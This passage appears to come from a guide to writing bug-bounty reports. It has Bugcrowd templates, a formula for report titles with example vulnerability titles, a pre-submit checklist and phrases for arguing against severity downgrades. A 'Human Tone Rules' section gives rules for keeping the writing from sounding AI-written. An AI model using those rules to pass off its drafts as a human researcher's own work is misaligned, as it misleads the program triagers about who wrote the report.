## Impact
An attacker can [specific action] resulting in [specific harm].
[Quantify if possible: "This affects all X users" or "Attacker can access Y data"]

## Severity Assessment
CVSS 3.1 Score: X.X ([Severity label])
Attack Vector: Network | Complexity: Low | Privileges: None | User Interaction: None
```

## Bugcrowd Report Template

```
Title: [Vuln] at [endpoint] -- [Impact in one line]

Bug Type: [IDOR/SSRF/XSS/etc]
Target: [URL or component]
Severity: [P1/P2/P3/P4]

Description:
[Root cause + exact location]

Reproduction:
1. [step]
2. [step]
3. [step]

Impact:
[Concrete business impact]

Fix Suggestion:
[Specific remediation]
```

## Human Tone Rules (Avoid AI-Sounding Writing)
- Start sentences with the impact, not the vulnerability name
- Write like you're explaining to a smart developer, not a textbook
- Use "I" and active voice: "I found that..." not "A vulnerability was discovered..."
- One concrete example beats three abstract sentences
- No em dashes, no "comprehensive/leverage/seamless/ensure"

## Report Title Formula

```
[Bug Class] in [Exact Endpoint/Feature] allows [attacker role] to [impact] [victim scope]
```

**Good titles:**
```
IDOR in /api/v2/invoices/{id} allows authenticated user to read any customer's invoice data
Missing auth on POST /api/admin/users allows unauthenticated attacker to create admin accounts
Stored XSS in profile bio field executes in admin panel -- allows privilege escalation
SSRF via image import URL parameter reaches AWS EC2 metadata service
Race condition in coupon redemption allows same code to be used unlimited times
```

**Bad titles:**
```
IDOR vulnerability found
Broken access control
XSS in user input
Security issue in API
```

## Impact Statement Formula (First Paragraph)

```
An [attacker with X access level] can [exact action] by [method], resulting in [business harm].
This requires [prerequisites] and leaves [detection/reversibility].
```

## The 60-Second Pre-Submit Checklist

```
[ ] Title follows formula: [Class] in [endpoint] allows [actor] to [impact]
[ ] First sentence states exact impact in plain English
[ ] Steps to Reproduce has exact HTTP request (copy-paste ready)
[ ] Response showing the bug is included (screenshot or response body)
[ ] Two test accounts used (not just one account testing itself)
[ ] CVSS score calculated and included
[ ] Recommended fix is one sentence (not a lecture)
[ ] No typos in the endpoint path or parameter names
[ ] Report is < 600 words (triagers skim long reports)
[ ] Severity claimed matches impact described (don't overclaim)
```

## Severity Escalation Language

When payout is being downgraded, use these counters:

| Program Says | You Counter With |
|---|---|
| "Requires authentication" | "Attacker needs only a free account (no special role)" |
| "Limited impact" | "Affects [N] users / [PII type] / [$ amount]" |
| "Already known" | "Show me the report number -- I searched and found none" |
| "By design" | "Show me the documentation that states this is intended" |
| "Low CVSS score" | "CVSS doesn't account for business impact -- attacker can steal [X]" |
